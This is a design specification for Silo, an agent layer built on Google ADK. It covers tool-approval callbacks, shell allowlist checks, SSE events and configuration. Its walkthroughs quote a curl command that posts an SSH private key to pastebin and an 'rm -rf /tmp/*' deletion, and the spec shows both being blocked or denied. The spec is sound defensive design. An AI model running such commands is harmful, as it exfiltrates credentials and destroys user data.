# Agent Systems Specification (V0)

The Agent is Silo's orchestration layer — it receives messages, calls LLMs, handles tool approval, executes tools, and streams responses. This spec replaces the custom Rust ReAct loop with Google ADK (Agent Development Kit) for Go. ADK provides agent lifecycle, tool calling, callback hooks, and session management. Silo configures ADK agents and implements callbacks for approval, audit, usage tracking, and SSE event mapping.

---

## 1. Agent Architecture Overview

### Why ADK Replaces the Custom Loop

The V0 Rust implementation used a hand-rolled ReAct loop (`DefaultBrain`, `Brain` trait, `DashMap` pending approvals, `oneshot` channels). This worked but required maintaining:

- LLM streaming and tool call parsing
- Iteration counting and retry logic
- Context assembly and budget arithmetic
- Tool call accumulation from stream chunks

ADK provides all of this out of the box. Silo's role shrinks to: configure agents, implement callback hooks, map events to SSE, and manage tool approval flow.

### What ADK Provides

| Concern | ADK Component | Replaces |
|---------|--------------|----------|
| Agent loop (reason + act) | `agent.LlmAgent` + `runner.Runner` | `DefaultBrain`, `run_react_loop()` |
| Tool calling protocol | ADK tool dispatch | Custom tool call parsing, `Muscle::execute()` routing |
| Context / session management | `SessionService` interface | Custom context assembly, budget arithmetic |
| Streaming | ADK event stream | Custom `TokenStream` consumption |
| Multi-agent orchestration | `SequentialAgent`, `ParallelAgent` | Not in V0 (was V1 deferred) |
| Callbacks (before/after tool, before/after model) | ADK callback hooks | Inline logic in `run_react_loop()` |

### What Silo Still Owns

- **Tool approval flow** — ADK has no concept of human-in-the-loop approval; Silo implements this via `BeforeToolCallback`
- **SSE event mapping** — translating ADK events into Silo's SSE event types for the gateway
- **Shell allowlist validation** — security layer that checks commands against `[security.shell]` config
- **Audit logging** — signed event trail via `AfterToolCallback`
- **Usage/cost tracking** — token extraction via `AfterModelCallback`
- **Configuration** — `[agent]` section in `silo.toml` drives ADK agent setup
- **Headless mode** — when `brain_enabled = false`, agent endpoints return 400

### Architecture Diagram

```
Client -> Gateway -> AgentHandler -> ADK Runner -> LLM Provider
                         |               |
                         |               +-> BeforeToolCallback (approval + allowlist)
                         |               +-> AfterToolCallback  (audit logging)
                         |               +-> BeforeModelCallback (session loading)
                         |               +-> AfterModelCallback  (usage tracking)
                         |               +-> ADK Tool dispatch -> Silo shell executor
                         |
                         +-> SSE Event Mapper -> SSE stream to client
```

### Two Modes

| Config | Mode | Agent Behavior |
|--------|------|----------------|
| `brain_enabled = true` | Claw | Full ADK agent loop — thinks, calls tools, streams responses |
| `brain_enabled = false` | Headless | Agent disabled. `/silo/brain/*` returns 400. External code drives via Muscle/Vault APIs |

---

## 2. ADK Agent Setup

### Core Agent Configuration

```go
package agent

import (
    "github.com/google/adk-go/pkg/agent"
    "github.com/google/adk-go/pkg/tool"
    "github.com/google/adk-go/pkg/runner"
)

// NewSiloAgent creates the primary Silo agent configured from silo.toml.
func NewSiloAgent(cfg *config.AgentConfig, model string, tools []tool.Tool) *agent.Agent {
    systemPrompt := loadSystemPrompt(cfg.SystemPromptPath)

    a := &agent.Agent{
        Name:                "silo",
        Model:               model,
        Instruction:         systemPrompt,
        Tools:               tools,
        BeforeToolCallback:  siloBeforeToolCallback,
        AfterToolCallback:   siloAfterToolCallback,
        BeforeModelCallback: siloBeforeModelCallback,
        AfterModelCallback:  siloAfterModelCallback,
    }

    return a
}
```

### Agent Lifecycle

1. On `silo start` (or `silo serve`), the agent is constructed from config.
2. On each `POST /silo/brain/chat` request, a `runner.Runner` executes the agent with the user's message.
3. ADK manages the reason-act loop internally: call LLM, detect tool calls, dispatch tools, feed results back, repeat until the LLM produces a final text response or max iterations is reached.
4. Silo's callbacks intercept at each phase boundary.

### Runner Execution

```go
func (h *AgentHandler) HandleChat(ctx context.Context, req ChatRequest, eventCh chan<- SseEvent) error {
    // 1. Resolve or create session
    session, resumed := h.sessionService.GetOrCreate(ctx, req.SessionID)
    eventCh <- SseEvent{Type: "session", Data: SessionData{
        SessionID:    session.ID,
        Resumed:      resumed,
        MessageCount: session.MessageCount(),
    }}

    // 2. Create runner with iteration limit from config
    cfg := h.config.Load()
    r := runner.New(h.agent, runner.WithMaxIterations(cfg.Agent.MaxIterations))

    // 3. Run agent — ADK streams events through a channel
    adkEvents := r.RunStream(ctx, session, req.Message)

    // 4. Map ADK events to Silo SSE events
    for evt := range adkEvents {
        sseEvents := mapADKEvent(evt)
        for _, sse := range sseEvents {
            eventCh <- sse
        }
    }

    eventCh <- SseEvent{Type: "done"}
    return nil
}
```

---

## 3. Tool Integration

### Wrapping Silo Tools as ADK Tools

Each Silo tool (shell executor, file reader, file writer) is wrapped as an ADK `tool.Tool` implementation:

```go
// ShellTool wraps Silo's shell executor as an ADK tool.
type ShellTool struct {
    executor *shell.Executor
}

func (t *ShellTool) Name() string        { return "bash" }
func (t *ShellTool) Description() string { return "Execute a shell command" }

func (t *ShellTool) InputSchema() map[string]any {
    return map[string]any{
        "type": "object",
        "properties": map[string]any{
            "cmd": map[string]any{
                "type":        "string",
                "description": "The command to execute",
            },
        },
        "required": []string{"cmd"},
    }
}

func (t *ShellTool) Execute(ctx context.Context, args map[string]any) (any, error) {
    cmd, _ := args["cmd"].(string)
    return t.executor.Run(ctx, cmd)
}
```

### Tool Registration

```go
tools := []tool.Tool{
    &ShellTool{executor: shellExec},
    &ReadTool{executor: fileExec},
    &WriteTool{executor: fileExec},
}
```

ADK passes these tool definitions to the LLM automatically. Silo does not need to inject tool schemas into the system prompt or manage tool definition formatting per provider — ADK handles this.

---

## 4. Callback Hooks

### BeforeToolCallback: Approval + Allowlist

This is the critical callback. It runs before every tool execution and implements two checks:

1. **Shell allowlist validation** — rejects commands not matching `[security.shell]` config
2. **Tool approval flow** — pauses execution when approval is required, waits for user decision

```go
func siloBeforeToolCallback(ctx context.Context, call tool.CallInfo) (tool.CallbackResult, error) {
    cfg := configFromCtx(ctx)
    eventCh := eventChFromCtx(ctx)

    // 1. Shell allowlist check (security layer)
    if call.ToolName == "bash" {
        cmd, _ := call.Args["cmd"].(string)
        if !cfg.Security.Shell.IsAllowed(cmd) {
            return tool.CallbackResult{
                Block:  true,
                Output: fmt.Sprintf("Command blocked by shell allowlist: %s", cmd),
            }, nil
        }
    }

    // 2. Tool approval check
    mode := cfg.Tools.Approval.ModeForTool(call.ToolName)
    switch mode {
    case "never":
        // Auto-approve — emit tool_call and proceed
        eventCh <- SseEvent{Type: "tool_call", Data: ToolCallData{
            CallID: call.ID,
            Tool:   call.ToolName,
            Args:   call.Args,
        }}
        return tool.CallbackResult{Block: false}, nil

    case "always", "per-tool":
        // Emit tool_pending, wait for approval
        eventCh <- SseEvent{Type: "tool_pending", Data: ToolPendingData{
            CallID: call.ID,
            Tool:   call.ToolName,
            Args:   call.Args,
        }}

        // Wait on approval channel with timeout
        approved, err := waitForApproval(ctx, call.ID, cfg.Tools.Approval.Timeout)
        if err != nil || !approved {
            reason := "Tool execution denied by user"
            if err != nil {
                reason = fmt.Sprintf("Approval timeout after %s", cfg.Tools.Approval.Timeout)
            }
            eventCh <- SseEvent{Type: "tool_denied", Data: ToolDeniedData{
                CallID: call.ID,
                Tool:   call.ToolName,
                Reason: reason,
            }}
            return tool.CallbackResult{
                Block:  true,
                Output: reason,
            }, nil
        }

        // Approved — emit tool_call and proceed
        eventCh <- SseEvent{Type: "tool_call", Data: ToolCallData{
            CallID: call.ID,
            Tool:   call.ToolName,
            Args:   call.Args,
        }}
        return tool.CallbackResult{Block: false}, nil
    }

    return tool.CallbackResult{Block: false}, nil
}
```

### AfterToolCallback: Audit Logging

Runs after every tool execution. Logs the tool call and result to the audit trail.

```go
func siloAfterToolCallback(ctx context.Context, call tool.CallInfo, result tool.Result) error {
    eventCh := eventChFromCtx(ctx)
    auditor := auditorFromCtx(ctx)

    // Emit tool_result SSE event
    eventCh <- SseEvent{Type: "tool_result", Data: ToolResultData{
        CallID:  call.ID,
        Tool:    call.ToolName,
        Success: result.Error == nil,
        Output:  truncateOutput(result.Output, maxToolOutputLen),
    }}

    // Audit log (V1: signed events)
    auditor.Log(audit.Event{
        Type:      "tool_execution",
        Tool:      call.ToolName,
        Args:      call.Args,
        Success:   result.Error == nil,
        Timestamp: time.Now(),
    })

    return nil
}
```

### BeforeModelCallback: Session Context Loading

Runs before each LLM call within the agent loop. Loads session messages and memory recall into the ADK session.

```go
func siloBeforeModelCallback(ctx context.Context, req *model.Request) error {
    cfg := configFromCtx(ctx)
    memStore := memoryStoreFromCtx(ctx)
    session := sessionFromCtx(ctx)

    // Memory recall (once per chat request, cached in context)
    if !memoryRecalledFromCtx(ctx) {
        query := extractUserQuery(req)
        results, err := memStore.Search(ctx, query, cfg.Memory.SearchTopK)
        if err != nil {
            // Graceful degradation — continue without memory
            log.Warn("memory recall failed", "error", err)
        } else {
            setMemoryResultsInCtx(ctx, results)
        }
        markMemoryRecalled(ctx)
    }

    // Inject memory results into system instruction if available
    memResults := memoryResultsFromCtx(ctx)
    if len(memResults) > 0 {
        memBlock := formatMemoryBlock(memResults, cfg.Agent.MemoryBudgetTokens)
        req.SystemInstruction = req.SystemInstruction + "\n\n" + memBlock
    }

    return nil
}
```

### AfterModelCallback: Usage Tracking

Runs after each LLM call. Extracts token counts for cost tracking.

```go
func siloAfterModelCallback(ctx context.Context, resp *model.Response) error {
    tracker := usageTrackerFromCtx(ctx)
    session := sessionFromCtx(ctx)

    if resp.Usage != nil {
        tracker.Record(usage.Entry{
            SessionID:    session.ID,
            Model:        resp.Model,
            InputTokens:  resp.Usage.InputTokens,
            OutputTokens: resp.Usage.OutputTokens,
            Timestamp:    time.Now(),
        })
    }

    return nil
}
```

---

## 5. Tool Approval via Go Channels

### Approval Architecture

The approval flow uses Go channels to coordinate between the SSE stream handler and the HTTP approval endpoint:

```go
// PendingApproval represents a tool call awaiting user decision.
type PendingApproval struct {
    CallID    string
    Tool      string
    Args      map[string]any
    ResultCh  chan bool       // true = approved, false = denied
    CreatedAt time.Time
}

// ApprovalManager tracks pending approvals across concurrent requests.
type ApprovalManager struct {
    mu       sync.RWMutex
    pending  map[string]*PendingApproval  // keyed by call_id
}

func (m *ApprovalManager) Register(callID string, toolName string, args map[string]any) <-chan bool {
    ch := make(chan bool, 1)
    m.mu.Lock()
    m.pending[callID] = &PendingApproval{
        CallID:    callID,
        Tool:      toolName,
        Args:      args,
        ResultCh:  ch,
        CreatedAt: time.Now(),
    }
    m.mu.Unlock()
    return ch
}

func (m *ApprovalManager) Resolve(callID string, approved bool) error {
    m.mu.Lock()
    pa, ok := m.pending[callID]
    if !ok {
        m.mu.Unlock()
        return fmt.Errorf("no pending approval for call_id: %s", callID)
    }
    delete(m.pending, callID)
    m.mu.Unlock()

    pa.ResultCh <- approved
    close(pa.ResultCh)
    return nil
}
```

### Wait with Timeout

```go
func waitForApproval(ctx context.Context, callID string, timeout time.Duration) (bool, error) {
    mgr := approvalMgrFromCtx(ctx)
    ch := mgr.Register(callID, "", nil)

    timeoutCtx, cancel := context.WithTimeout(ctx, timeout)
    defer cancel()

    select {
    case approved := <-ch:
        return approved, nil
    case <-timeoutCtx.Done():
        mgr.Cleanup(callID)
        return false, fmt.Errorf("approval timed out")
    }
}
```

### HTTP Approval Endpoint

```go
// POST /silo/brain/tool-approval
// Body: { "call_id": "abc123", "approved": true }
func (h *AgentHandler) HandleToolApproval(ctx context.Context, req ApprovalRequest) error {
    return h.approvalMgr.Resolve(req.CallID, req.Approved)
}
```

Multiple pending approvals can coexist (the LLM may request multiple tools in one iteration, each requiring approval). Each gets its own channel.

---

## 6. SSE Event Mapping

### ADK Events to Silo SSE Events

ADK emits events through a channel during `RunStream`. Silo maps these to the SSE event types defined in [03_gateway.md S4](03_gateway.md):

| ADK Event | Silo SSE Event | Notes |
|-----------|----------------|-------|
| Text output (streaming token) | `event: token` | Forwarded immediately, token by token |
| Tool call initiated | `event: tool_call` | Emitted from `BeforeToolCallback` (after approval if needed) |
| *(no ADK equivalent)* | `event: tool_pending` | Emitted from `BeforeToolCallback` when approval required |
| Tool result returned | `event: tool_result` | Emitted from `AfterToolCallback` |
| *(no ADK equivalent)* | `event: tool_denied` | Emitted from `BeforeToolCallback` on denial/timeout |
| Error | `event: error` | ADK errors mapped to Silo error format |
| Completion (final response) | `event: done` | Emitted after ADK run completes |

### Event Mapper Implementation

```go
func mapADKEvent(evt runner.Event) []SseEvent {
    switch e := evt.(type) {
    case *runner.TextChunkEvent:
        return []SseEvent{{Type: "token", Data: TokenData{Content: e.Text}}}

    case *runner.ErrorEvent:
        return []SseEvent{{Type: "error", Data: ErrorData{Message: e.Error.Error()}}}

    default:
        // Tool call/result events are emitted directly from callbacks,
        // not through the ADK event stream mapping.
        return nil
    }
}
```

Tool-related SSE events (`tool_call`, `tool_pending`, `tool_result`, `tool_denied`) are emitted directly from the `BeforeToolCallback` and `AfterToolCallback` — not from the event mapper. This is because the approval flow requires emitting events at precise moments (before waiting, after decision) that only the callback has visibility into.

---

## 7. System Prompt

### Default Built-in Prompt

```
You are Silo, a local-first AI assistant. You have access to tools for executing
shell commands, reading files, and writing files.

When you need to perform an action, use the appropriate tool. Always explain what
you're about to do before calling a tool. If a tool call fails, try an alternative
approach or explain what went wrong.

Important guidelines:
- Be concise and direct
- Prefer using tools over asking the user to do things manually
- If you're unsure, ask for clarification
```

ADK handles tool definition injection automatically. Unlike the previous custom loop, Silo does not need to format tool schemas into the system prompt — ADK includes them in the LLM request based on the registered `Tools` slice.

### Custom System Prompt

Configurable via `agent.system_prompt_path` — points to a markdown file that replaces the default:

```toml
[agent]
system_prompt_path = "~/.silo/system_prompt.md"
```

If the file is empty or missing, the default prompt is used.

### Memory Injection

Memory recall results are appended to the system instruction in `BeforeModelCallback` (see S4). The format:

```
[Relevant knowledge from memory]
- I prefer TOML over YAML (preference, source: user)
- Deploy keys are in ~/.ssh/deploy_ed25519 (fact, source: user)
[End of memory recall]
```

This is injected once per chat request (not per iteration) and capped by `agent.memory_budget_tokens`.

---

## 8. Error Handling

### Error Matrix

| Error | Response | Retry? | Details |
|-------|----------|--------|---------|
| LLM unreachable | ADK retries internally, then `event: error` | Yes (ADK managed) | Silo configures retry count via `retry_on_error` |
| Unknown tool name | ADK returns error to LLM | No | LLM receives: "Tool 'X' does not exist" |
| Invalid tool arguments | ADK returns error to LLM | No | LLM receives: "Invalid arguments for tool 'X': ..." |
| Shell command blocked | `BeforeToolCallback` blocks, synthetic result | No | LLM receives: "Command blocked by shell allowlist" |
| Approval denied | `event: tool_denied`, synthetic denial result | No | LLM decides recovery |
| Approval timeout | `event: tool_denied`, synthetic timeout result | No | Default timeout: 30s (configurable) |
| Tool execution error | `event: tool_result` with `success=false` | No | LLM receives the error output, decides recovery |
| Max iterations reached | `event: error` with warning, then `done` | No | Prevents infinite loops |
| Memory recall failure | Continue without memory (graceful degradation) | No | Log warning, proceed with empty memory block |
| Stream interrupted | `event: error`, cleanup | No | Client disconnect or context cancellation |

### Retry Configuration

ADK handles LLM call retries. Silo passes retry configuration when constructing the runner:

```go
r := runner.New(h.agent,
    runner.WithMaxIterations(cfg.Agent.MaxIterations),
    runner.WithRetryOnError(cfg.Agent.RetryOnError),
    runner.WithRetryBackoff(time.Duration(cfg.Agent.RetryBackoffMs) * time.Millisecond),
)
```

### Approval Timeout Handling

Approval timeout is handled in `waitForApproval` via `context.WithTimeout`. When the timeout fires:

1. The pending approval is cleaned up from the `ApprovalManager`.
2. `BeforeToolCallback` returns `Block: true` with a timeout message.
3. ADK receives the blocked result and feeds it back to the LLM as a synthetic tool response.
4. The LLM decides how to proceed (inform user, try alternative).

---

## 9. Headless Mode

When `brain_enabled = false` in `silo.toml`:

### Disabled Endpoints

| Endpoint | Response |
|----------|----------|
| `POST /silo/brain/chat` | `400 Bad Request: Internal Brain Disabled` |
| `POST /silo/brain/tool-approval` | `400 Bad Request: Internal Brain Disabled` |
| `POST /v1/chat/completions` | `400 Bad Request: Internal Brain Disabled` |

### Active Endpoints

All Muscle and Vault endpoints remain fully functional:

- `POST /silo/muscle/execute` — tool execution
- `GET /silo/muscle/tools` — tool listing
- `POST /silo/vault/store`, `POST /silo/vault/query` — memory
- `DELETE /silo/vault/memory/{id}`, `GET /silo/vault/memory`, `POST /silo/vault/memory/ingest` — memory management
- `GET /silo/vault/sessions`, etc. — session management
- `GET /silo/health`, `GET /silo/status` — health checks

### CLI Impact

- `silo chat` unavailable (prints: "Brain is disabled. Use `silo start` for full agent mode or enable brain_enabled in silo.toml.")
- `silo serve` is the recommended command for headless mode (same as `silo start` with `brain_enabled = false`)

### Use Case

External code (Python, Go, etc.) drives the agent logic and uses Silo as a local execution + memory daemon:

```python
# External Python agent using Silo in headless mode
import requests

SILO = "http://127.0.0.1:5110"
TOKEN = "Bearer ..."

# Execute a tool
r = requests.post(f"{SILO}/silo/muscle/execute",
    headers={"Authorization": TOKEN},
    json={"tool": "bash", "args": {"cmd": "ls"}})

# Search memory
r = requests.post(f"{SILO}/silo/vault/query",
    headers={"Authorization": TOKEN},
    json={"query": "deploy key location"})
```

---

## 10. Configuration

New `[agent]` section in `silo.toml`. See [09_configuration.md S2](09_configuration.md) for the canonical schema reference.

```go
type AgentConfig struct {
    MaxIterations      int    `toml:"max_iterations"`       // default: 25
    SystemPromptPath   string `toml:"system_prompt_path"`   // default: "" (built-in)
    MemoryBudgetTokens int    `toml:"memory_budget_tokens"` // default: 2048
    ToolParallel       bool   `toml:"tool_parallel"`        // default: true
    RetryOnError       int    `toml:"retry_on_error"`       // default: 1
    RetryBackoffMs     int    `toml:"retry_backoff_ms"`     // default: 1000
}
```

| Key | Type | Default | Hot/Cold | Description |
|-----|------|---------|----------|-------------|
| `max_iterations` | int | `25` | Hot | Maximum agent loop iterations before forced stop |
| `system_prompt_path` | string | `""` | Hot | Path to custom system prompt file (empty = built-in default) |
| `memory_budget_tokens` | int | `2048` | Hot | Max tokens for memory recall in context |
| `tool_parallel` | bool | `true` | Hot | Allow ADK to execute multiple tool calls in parallel |
| `retry_on_error` | int | `1` | Hot | Number of LLM call retries on transient errors |
| `retry_backoff_ms` | int | `1000` | Hot | Base backoff delay in milliseconds (doubled per retry) |

All agent config keys are **Hot** — the handler reads config via `config.Load()` on every chat request, so changes take effect on the next request.

### Example silo.toml

```toml
[agent]
max_iterations = 30
system_prompt_path = "~/.silo/system_prompt.md"
memory_budget_tokens = 4096
tool_parallel = true
retry_on_error = 2
retry_backoff_ms = 500
```

---

## 11. V0 / V1 Scoping Summary

### V0 Ships

| Feature | Section |
|---------|---------|
| Single ADK `LlmAgent` with system prompt + tools | S2 |
| Silo tools wrapped as ADK `tool.Tool` implementations | S3 |
| `BeforeToolCallback` for approval flow + shell allowlist | S4 |
| `AfterToolCallback` for audit logging | S4 |
| `BeforeModelCallback` for session + memory injection | S4 |
| `AfterModelCallback` for usage tracking | S4 |
| Tool approval via Go channels with timeout | S5 |
| SSE event mapping (ADK events to Silo events) | S6 |
| Configurable system prompt (built-in default + custom file) | S7 |
| Error handling with ADK-managed retries | S8 |
| Headless mode (agent disabled, Muscle/Vault active) | S9 |
| `[agent]` configuration section (6 keys, all Hot) | S10 |

### V1 Deferred

| Feature | Notes |
|---------|-------|
| Multi-agent orchestration | ADK `SequentialAgent` and `ParallelAgent` for delegation |
| Memory-augmented context with compaction | Dynamic context management across iterations |
| Signed audit events | Tamper-evident audit trail (currently unsigned logging) |
| Research phase | Proactive info gathering before answering |
| Planning / goal tracking | Break complex tasks into sub-goals |
| Routines engine | Cron/event-triggered agent workflows |
| Thinking modes | Depth control (quick answer vs deep analysis) |
| Dynamic tool generation | Agent creates new tools at runtime |
| Skill system | SKILL.md prompt extensions (domain-specific knowledge) |
| Streaming tool results | Stream tool output in real-time (not wait for completion) |

---

## 12. Cross-References

| Spec | Interaction |
|------|-------------|
| [03_gateway.md S3, S4](03_gateway.md) | Agent API endpoints (`/silo/brain/chat`, `/silo/brain/tool-approval`). SSE event types match Silo SSE events |
| [04_providers.md S2](04_providers.md) | Provider model configuration passed to ADK agent constructor |
| [05_channels.md S3](05_channels.md) | Tool approval flow (approval modes, timeout, per-tool rules) |
| [06_sessions.md S4](06_sessions.md) | Session persistence. ADK `SessionService` wraps Silo's session store |
| [07_security.md S5, S10](07_security.md) | Shell allowlist validation in `BeforeToolCallback`. Tool execution sandboxing |
| [08_cli.md S4](08_cli.md) | `silo chat` triggers the ADK agent loop |
| [09_configuration.md S2](09_configuration.md) | `[agent]` config keys in the canonical schema reference |
| [10_memory.md S5, S7](10_memory.md) | `MemoryStore.Search()` for context injection in `BeforeModelCallback`. Memory budget |

---

## 13. Verification Walkthroughs

### 1. Simple Chat (No Tools)

1. User sends "What is the capital of France?" via `POST /silo/brain/chat`.
2. `AgentHandler` creates/resumes session. Emits `event: session`.
3. `BeforeModelCallback` fires: calls `MemoryStore.Search("capital of France")` — returns empty (no relevant knowledge).
4. ADK sends message to LLM with system prompt + tool definitions.
5. LLM streams "The capital of France is Paris." — ADK emits text chunk events.
6. Event mapper converts each text chunk to `event: token`.
7. LLM returns no tool calls. ADK run completes.
8. `AfterModelCallback` fires: records token usage.
9. Handler emits `event: done`. Total: 1 LLM call, 0 tool executions.

### 2. Tool Call with Approval Flow

1. User: "List the files in my home directory."
2. ADK calls LLM. LLM returns tool call: `bash(cmd: "ls ~")`.
3. `BeforeToolCallback` fires:
   a. Shell allowlist check: `ls ~` passes.
   b. Approval mode for `bash` is `"always"` — approval required.
   c. Emit `event: tool_pending { call_id: "abc", tool: "bash", args: { cmd: "ls ~" } }`.
   d. `waitForApproval("abc", 30s)` — blocks on Go channel.
4. Client shows approval prompt. User clicks "Approve".
5. Client sends `POST /silo/brain/tool-approval { call_id: "abc", approved: true }`.
6. `ApprovalManager.Resolve("abc", true)` sends `true` on channel.
7. `BeforeToolCallback` resumes, emits `event: tool_call`, returns `Block: false`.
8. ADK executes `ShellTool.Execute(ctx, {cmd: "ls ~"})`.
9. `AfterToolCallback` fires: emits `event: tool_result { success: true, output: "Documents\nDownloads\n..." }`, logs audit event.
10. ADK feeds tool result back to LLM (iteration 2).
11. LLM: "Here are the files in your home directory: Documents, Downloads, ..." — streamed as `event: token`.
12. No more tool calls. ADK run completes. `event: done`. Total: 2 iterations.

### 3. Tool Call Denied by User

1. User: "Delete all files in /tmp."
2. LLM returns tool call: `bash(cmd: "rm -rf /tmp/*")`.
3. `BeforeToolCallback` fires:
   a. Shell allowlist check: `rm -rf /tmp/*` passes (allowlist permits `rm` in this example).
   b. Approval mode is `"always"`.
   c. Emit `event: tool_pending`.
   d. Wait on approval channel.
4. User clicks "Deny" in the client.
5. `ApprovalManager.Resolve(callID, false)` sends `false` on channel.
6. `BeforeToolCallback` emits `event: tool_denied { reason: "Tool execution denied by user" }`.
7. Returns `Block: true` with denial message. ADK feeds this back to LLM.
8. LLM responds: "Understood, I won't delete those files." — streamed as tokens.
9. `event: done`. The tool was never executed.

### 4. Shell Allowlist Blocks Command

1. User: "Send my SSH key to pastebin."
2. LLM returns: `bash(cmd: "curl -X POST https://pastebin.com/api -d @~/.ssh/id_ed25519")`.
3. `BeforeToolCallback` fires:
   a. Shell allowlist check: `curl` to external URL blocked by `[security.shell]` config.
   b. Returns `Block: true` with "Command blocked by shell allowlist: curl".
   c. No `tool_pending` emitted — blocked before approval stage.
4. ADK feeds block message to LLM.
5. LLM: "I can't execute that command — it's blocked by the security policy." — streamed as tokens.
6. `event: done`.

### 5. Approval Timeout

1. User: "Run the deploy script."
2. LLM returns: `bash(cmd: "./deploy.sh")`.
3. `BeforeToolCallback` emits `event: tool_pending`, waits on channel.
4. User does not respond within 30 seconds (configured `approval_timeout`).
5. `context.WithTimeout` fires. `waitForApproval` returns error.
6. `BeforeToolCallback` emits `event: tool_denied { reason: "Approval timeout after 30s" }`.
7. ADK feeds timeout message to LLM.
8. LLM: "The tool approval timed out. Would you like me to try again?" — streamed as tokens.
9. `event: done`.

### 6. Multi-Tool Parallel Execution

1. User: "Show me the contents of config.toml and also list the tools directory."
2. LLM returns 2 tool calls: `[bash("cat config.toml"), bash("ls tools/")]`.
3. `tool_parallel = true` — ADK dispatches both tools.
4. `BeforeToolCallback` fires for each (approval mode is `"never"` for read-only commands).
5. Both tools execute concurrently. Both `AfterToolCallback` fire with results.
6. ADK collects results, feeds back to LLM.
7. LLM formats combined output for the user. `event: done`. Total: 2 iterations.

### 7. Memory Recall Injected in Context

1. User previously stored: `silo memory add "I prefer TOML over YAML"`.
2. User asks: "What config format should I use?"
3. `BeforeModelCallback` fires: `MemoryStore.Search("config format")` returns hit.
4. Memory block injected into system instruction:
   `[Relevant knowledge from memory]\n- I prefer TOML over YAML (preference, source: user)\n[End of memory recall]`
5. LLM sees the preference and recommends TOML. Response references the user's stated preference.
6. Memory recall is cached — subsequent iterations in the same chat request reuse the result.

### 8. Max Iterations Reached

1. User requests a task that causes the LLM to make tool calls every iteration.
2. After 25 iterations (default `max_iterations`), ADK stops the run.
3. Handler emits `event: error { message: "Maximum iterations (25) reached" }`.
4. Handler emits `event: done`.
5. The partial progress is preserved in session history.

### 9. Headless Mode Flow

1. `brain_enabled = false` in `silo.toml`. User runs `silo serve --daemon`.
2. External Python script sends `POST /silo/brain/chat` — receives `400 Bad Request: Internal Brain Disabled`.
3. Script uses direct tool execution: `POST /silo/muscle/execute { tool: "bash", args: { cmd: "ls" } }` — `200 OK` with output.
4. Script stores knowledge: `POST /silo/vault/store { content: "found 5 files", entry_type: "fact" }` — `201 Created`.
5. Script searches memory: `POST /silo/vault/query { query: "how many files" }` — results returned.
6. `silo chat` from CLI prints error: "Brain is disabled."
